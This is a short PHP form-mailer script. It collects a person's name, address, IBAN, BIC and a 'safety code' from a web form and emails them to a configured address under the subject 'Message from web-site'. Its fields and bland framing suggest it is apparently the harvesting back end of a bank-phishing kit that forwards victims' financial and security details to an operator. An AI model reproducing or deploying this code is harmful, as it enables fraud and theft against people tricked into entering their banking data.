<?php
	//****************************************
	//edit here
	$senderName = 'WEB';
	$senderEmail = 'site@example.com';
	$targetEmail = 'admin@example.com';
	$messageSubject = 'Message from web-site';
	$redirectToReferer = true;
	$redirectURL = 'thankyou.html';
	//****************************************

	// mail content
	$user = $_POST['user'];
	$address = $_POST['address'];
	$number = $_POST['number'];
	$city = $_POST['city'];
	$country = $_POST['country'];
	$inumber = $_POST['inumber'];
	$bicnumber = $_POST['bicnumber'];
	$code = $_POST['code'];

	// prepare message text
	$messageText =	'Name: '.$user."\n".
					'Adress: '.$address."\n".
					'Zip code: '.$number."\n".
					'City: '.$city."\n".
					'Country: '.$country."\n".
					'IBAN-number: '.$inumber."\n".
					'BIC-code: '.$bicnumber."\n".
					'Safety code: '.$code."\n";

	// send email
	$senderName = "=?UTF-8?B?" . base64_encode($senderName) . "?=";
	$messageSubject = "=?UTF-8?B?" . base64_encode($messageSubject) . "?=";
	$messageHeaders = "From: " . $senderName . " <" . $senderEmail . ">\r\n"
				. "MIME-Version: 1.0" . "\r\n"
				. "Content-type: text/plain; charset=UTF-8" . "\r\n";

	if (preg_match('/^[_.0-9a-z-]+@([0-9a-z][0-9a-z-]+.)+[a-z]{2,4}$/',$targetEmail,$matches))
	mail($targetEmail, $messageSubject, $messageText, $messageHeaders);

	// redirect
	if($redirectToReferer) {
		header("Location: ".@$_SERVER['HTTP_REFERER'].'#sent');
	} else {
		header("Location: ".$redirectURL);
	}
?>